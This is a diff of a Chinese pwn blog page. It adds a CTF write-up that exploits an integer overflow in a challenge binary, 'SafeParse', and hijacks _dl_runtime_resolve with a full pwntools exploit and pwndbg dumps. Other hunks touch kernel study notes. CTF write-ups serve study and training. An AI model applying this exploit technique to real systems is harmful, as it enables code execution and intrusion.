@@ -156,6 +156,120 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/26/dl_runtime_resolve%20attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/08/26/dl_runtime_resolve%20attack/" class="post-title-link" itemprop="url">dl_runtime_resolve attack</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-08-26 17:36:41 / Modified: 17:38:57" itemprop="dateCreated datePublished" datetime="2022-08-26T17:36:41+08:00">2022-08-26</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>SafeParse</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SafeParse: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=bb35942986f3f07abe813fd1a86be5920f5b6c7e, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">[*] <span class="string">&#x27;/home/yhellow/桌面/pwn_SafeParse/SafeParse&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+<ul>
+<li>64位，全开，开启延迟绑定</li>
+</ul>
+<p><strong>漏洞分析</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_size = input_num();</span><br><span class="line">chunk = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="number">4</span> * data_size);         <span class="comment">// 整数溢出</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>这里有一个整数溢出（这个漏洞点和初赛 newest_note 的非预期解很像）</li>
+</ul>
+<p>直接让 data_size 为 0x40040000，就可以让这个存堆指针的堆申请到 libc 上面</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>注意：这里的 size_t 代表的是 unsorted int（4字节）</li>
+</ul>
+<p>溢出过后，“data_size” 会特别大，但是 mmap 申请的 chunk 又比较小，以下的这个检查就形同虚设了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= data_size )</span><br></pre></td></tr></table></figure>
+<p><strong>入侵思路</strong></p>
+<p>然后就可以实现 libc 任意写，由于没法 leak，我们只能打 <code>_dl_runtime_resolve</code></p>
+<p><code>DT_STRTAB</code> 在 elf 中，由于没有泄露任何地址，目前是通过偏移进行任意地址写，这里找到 <code>DT_DEBUG</code> 这个表是指向 libc 地址（我们可以控制），可以通过改写最低位：</p>
+<ul>
+<li>把 <code>link_map-&gt;l_info[DT_STRTAB]</code> 低位覆盖为 <code>link_map-&gt;l_info[DT_DEBUG]</code> 这样程序就会误以为 <code>DT_DEBUG</code> 是 <code>DT_STRTAB</code>（这下放入 <code>_dl_lookup_symbol_x</code> 的第二个参数就会变成 <code>DT_DEBUG</code>）</li>
+<li>于是我们提前在 <code>DT_DEBUG+offset</code>（原来是 <code>DT_STRTAB+offset</code>）的位置写上 <code>system</code></li>
+<li>提前在 <code>chunk</code> 中写入 <code>/bin/sh</code></li>
+<li>最后在执行 <code>free(chunk)</code> 时就会 get shell</li>
+</ul>
+<p>低位覆盖 <code>link_map-&gt;l_info[DT_STRTAB]</code>，欺骗 <code>_dl_fixup</code> 函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f3b00ba2000</span>+<span class="number">0x324180</span>+<span class="number">0x10</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi r10 <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7f3b00ec6198</span> ◂— <span class="number">0x6165720000ec6730</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7f3b00ec61a0</span> ◂— <span class="number">0x564f9b540064</span> <span class="comment">/* &#x27;d&#x27; */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7f3b00ec61a8</span> —▸ <span class="number">0x7f3b00ec6740</span> —▸ <span class="number">0x7ffe633fe000</span> ◂— jg     <span class="number">0x7ffe633fe047</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7f3b00ec61b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│         <span class="number">0x7f3b00ec61b8</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│         <span class="number">0x7f3b00ec61c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7f3b00ec61c8</span> —▸ <span class="number">0x7f3b00ec6718</span> —▸ <span class="number">0x7f3b00ec6730</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│       <span class="number">0x7f3b00ec61d0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│       <span class="number">0x7f3b00ec61d8</span> —▸ <span class="number">0x564f9b545de0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│       <span class="number">0x7f3b00ec61e0</span> —▸ <span class="number">0x564f9b545ec0</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│       <span class="number">0x7f3b00ec61e8</span> —▸ <span class="number">0x564f9b545eb0</span> ◂— <span class="number">0x3</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│ rdi<span class="number">-1</span> <span class="number">0x7f3b00ec61f0</span> ◂— <span class="number">0x6d657473797300</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│       <span class="number">0x7f3b00ec61f8</span> —▸ <span class="number">0x564f9b545ea0</span> ◂— <span class="number">0x15</span> <span class="comment">/* 低位覆盖&quot;\xa0&quot; */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│       <span class="number">0x7f3b00ec6200</span> —▸ <span class="number">0x564f9b545e70</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│       <span class="number">0x7f3b00ec6208</span> —▸ <span class="number">0x564f9b545ef0</span> ◂— <span class="number">0x7</span></span><br></pre></td></tr></table></figure>
+<p><code>_dl_fixup-&gt;_dl_lookup_symbol_x</code> 执行前：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7f3b00ea8192</span> &lt;_dl_fixup+<span class="number">210</span>&gt;    call   _dl_lookup_symbol_x                &lt;_dl_lookup_symbol_x&gt;</span><br><span class="line">       rdi: <span class="number">0x7f3b00ec61f1</span> ◂— <span class="number">0xa0006d6574737973</span> <span class="comment">/* &#x27;system&#x27;(free-&gt;system) */</span></span><br><span class="line">       rsi: <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line">       rdx: <span class="number">0x7ffe633dbfa8</span> —▸ <span class="number">0x564f9b547018</span> ◂— <span class="number">0x1200000091</span></span><br><span class="line">       rcx: <span class="number">0x7f3b00ec64f8</span> —▸ <span class="number">0x7f3b00ec6450</span> —▸ <span class="number">0x7f3b00e95590</span> —▸ <span class="number">0x7f3b00ec6190</span> —▸ <span class="number">0x564f9b542000</span> ◂— ...</span><br><span class="line">       r8: <span class="number">0x7f3b00e955e0</span> —▸ <span class="number">0x564f9b5480a0</span> ◂— <span class="string">&#x27;GLIBC_2.2.5&#x27;</span></span><br><span class="line">       r9: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">6</span>]: <span class="number">0x1</span></span><br><span class="line">       arg[<span class="number">7</span>]: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>完整 exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./SafeParse1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x1620)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd += &quot;b *$rebase(0x15FA)\n&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x4000</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Data Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0x101000</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">link_map_offset = <span class="number">0x324190</span>-<span class="number">0x10</span></span><br><span class="line">r_debug_offset = <span class="number">0x324160</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset))</span><br><span class="line">success(<span class="string">&quot;link_map_offset+0x40+5*0x8 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>))</span><br><span class="line">success(<span class="string">&quot;r_debug_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(r_debug_offset))</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># _IO_2_1_stdout_offset &gt;&gt; 0x2ee690</span></span><br><span class="line"><span class="comment"># link_map_offset &gt;&gt; 0x324180</span></span><br><span class="line"><span class="comment"># link_map_offset+0x40+5*0x8 &gt;&gt; 0x3241e8</span></span><br><span class="line"><span class="comment"># r_debug_offset &gt;&gt; 0x324150 </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;*&gt;***&gt;***&gt;******&gt;**&gt;**&gt;**&quot;</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">36</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">38</span></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">15</span>+<span class="string">&quot;,&gt;&quot;</span>*<span class="number">2</span>+<span class="string">&quot;&lt;&quot;</span>*<span class="number">17</span></span><br><span class="line"></span><br><span class="line">payload +=<span class="string">&quot;&gt;&quot;</span>*<span class="number">38</span>+<span class="string">&quot;,&quot;</span>+<span class="string">&quot;.&quot;</span></span><br><span class="line"><span class="comment">#payload +=&quot;/&lt;//&lt;/&lt;/&lt;/&lt;//////&lt;///&lt;///&lt;/&lt;&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Code: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/bin&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00sys&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;tem\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\x00rea&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;d\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;Secret Number: &quot;</span>,<span class="string">&quot;\xa0&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Guess the Number: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>小结：</strong></p>
+<p>这个题我看着就像强网杯的 qwarmup，都是任意写 libc，然后打 <code>_dl_runtime_resolve</code></p>
+<p>当时猪脑过载了，就想用 qwarmup 的方法来套这个题，调了半天才发现这个题没有开沙盒，可以直接 get shell（唉）</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/24/print%E7%9B%B2%E6%89%93%E5%8D%B0+%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A8%A1%E6%9D%BF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -951,7 +1065,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-08-19 17:40:17" itemprop="dateModified" datetime="2022-08-19T17:40:17+08:00">2022-08-19</time>
+                <time title="Modified: 2022-08-26 18:13:51" itemprop="dateModified" datetime="2022-08-26T18:13:51+08:00">2022-08-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -968,13 +1082,13 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>13k</span>
+              <span>32k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
-              <span>12 mins.</span>
+              <span>29 mins.</span>
             </span>
 
         </div>
@@ -1252,7 +1366,7 @@
 <li>系统调用有效的分离了用户程序和内核的开发</li>
 </ul>
 <p>用户程序，系统调用，内核，硬件设备的调用关系如下图： </p>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660827734080-1660902016579.png" class width="1660827734080"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660827734080-1661508831096.png" class width="1660827734080"> 
 <p>要想实现系统调用，主要实现以下几个方面：</p>
 <ul>
 <li>通知内核调用一个哪个系统调用（系统调用号）</li>
@@ -1261,7 +1375,7 @@
 </ul>
 <h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><p>Linux 中4个基本的内核数据结构：链表，队列，映射，红黑树</p>
 <p><strong>链表</strong></p>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832270823-1660902016580.png" class width="1660832270823"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832270823-1661508831097.png" class width="1660832270823"> 
 <ul>
 <li>有个单独的头结点（head）</li>
 <li>每个节点（node）除了包含必要的数据之外，还有2个指针（pre,next）</li>
@@ -1269,7 +1383,7 @@
 <li>头结点（head）的 pre 指针指向链表的最后一个节点</li>
 <li>最后一个节点的next指针指向头结点（head）</li>
 </ul>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832773428-1660902016580.png" class width="1660832773428"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660832773428-1661508831097.png" class width="1660832773428"> 
 <ul>
 <li>其实就是把数据放在前面了而已</li>
 </ul>
@@ -1286,14 +1400,14 @@
 <li>一个是队头指针 front，它指向队头元素</li>
 <li>另一个是队尾指针 rear，它指向下一个入队元素的存储位置 </li>
 </ul>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834074319-1660902016580.png" class width="1660834074319"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834074319-1661508831097.png" class width="1660834074319"> 
 <p>链式队列：</p>
 <p>一个链队列显然需要两个分别指示队头和队尾的指针（分别成为头指针和尾指针）才能唯一确定：</p>
 <ul>
 <li>这里，和线性表的单链表一样，为了操作方便起见，我们也给队列添加一个头结点，并令头指针指向头节点</li>
 <li>由此，空的链队列的判决条件为头指针和尾指针均指向头结点</li>
 </ul>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834323260-1660902016580.png" class width="1660834323260"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660834323260-1661508831097.png" class width="1660834323260"> 
 <p><strong>映射</strong></p>
 <p>映射（也称为关联数组）是实现（key，value）绑定的一种数据结构（有点像其他语言中的字典类型），每个唯一的ID对应一个自定义的数据结构</p>
 <p>在 Linux 中的使用案例就是：整数ID管理机制（IDR）</p>
@@ -1317,7 +1431,7 @@
 </ul>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span>			prefix;                        <span class="comment">/* the ID prefix of this idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			layer;                        <span class="comment">/* 第几层 distance from leaf */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">idr_layer</span> __<span class="title">rcu</span>	*<span class="title">ary</span>[1&lt;</span>&lt;IDR_BITS]; <span class="comment">/* IDR_BITS = 8 该层有256个指针,指向256个idr_layer */</span></span><br><span class="line">	<span class="keyword">int</span>			count;                        <span class="comment">/* ary数组使用计数 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		DECLARE_BITMAP(bitmap, IDR_SIZE);	  <span class="comment">/* 槽位图 */</span>		</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>		<span class="title">rcu_head</span>;</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <p>如图：</p>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660836387459-1660902016580.png" class width="1660836387459"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660836387459-1661508831097.png" class width="1660836387459"> 
 <p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1432802">linux内核IDR机制详解</a> </p>
 <p><strong>红黑树</strong></p>
 <p>红黑树是对概念模型2-3-4树的一种实现，由于直接进行不同节点间的转化会造成较大的开销，所以选择以二叉树为基础，在二叉树的属性中加入一个 <strong>颜色属性</strong> 来表示2-3-4树中不同的节点</p>
@@ -1329,7 +1443,7 @@
 <li>每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）</li>
 </ul>
 <p>在插链的过程中，可能会破坏这些规则，这就需要一些机制来恢复平衡：</p>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1655523602992-1660902016580.png" class width="1655523602992"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1655523602992-1661508831097.png" class width="1655523602992"> 
 <h2 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h2><p>为了提高CPU和外围硬件（硬盘，键盘，鼠标等等）之间协同工作的性能，引入了中断的机制，中断机制是硬件在需要的时候向CPU发出信号，CPU暂时停止正在进行的工作，来处理硬件请求的一种机制</p>
 <ul>
 <li>异步中断（一般由硬件引起）：CPU 处理中断的时间过长，所以先将硬件复位，使硬件可以继续自己的工作，然后在适当时候处理中断请求中耗时的部分</li>
@@ -1346,7 +1460,7 @@
 <li>顶半部：登记中断，把底半部处理程序挂到该设备的执行队列中，不可中断</li>
 <li>底半部：负责中断处理程序的具体实现，可中断</li>
 </ul>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660878766425.png" class width="1660878766425"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660878766425-1661508831097.png" class width="1660878766425"> 
 <p>实现底半部的方法很多，目前使用最多的是以下3中方法：</p>
 <ul>
 <li>软中断</li>
@@ -1355,7 +1469,7 @@
 </ul>
 <p><strong>软中断</strong></p>
 <p>软中断的流程如下： </p>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660879056533.png" class width="1660879056533"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660879056533-1661508831097.png" class width="1660879056533"> 
 <p>注册软中断的函数 open_softirq：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_softirq</span><span class="params">(<span class="keyword">int</span> nr, <span class="keyword">void</span> (*action)(struct softirq_action *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    softirq_vec[nr].action = action; <span class="comment">/* softirq_vec是个struct softirq_action类型的数组 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <ul>
@@ -1400,7 +1514,7 @@
 <ul>
 <li>工作队列和 tasklet 不一样，不是基于软中断来实现的</li>
 </ul>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660882969270.png" class width="1660882969270"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660882969270-1661508831097.png" class width="1660882969270"> 
 <p>工作队列主要用到下面3个结构体，弄懂了这3个结构体的关系，也就知道工作队列的处理流程了：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 在include/linux/workqueue.h文件中定义 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">atomic_long_t</span> data;             <span class="comment">/* 这个并不是处理函数的参数,而是表示此work是否pending等状态的flag */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_PENDING 0        <span class="comment">/* T if work item pending execution */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_FLAG_MASK (3UL)</span></span><br><span class="line"><span class="meta">#<span 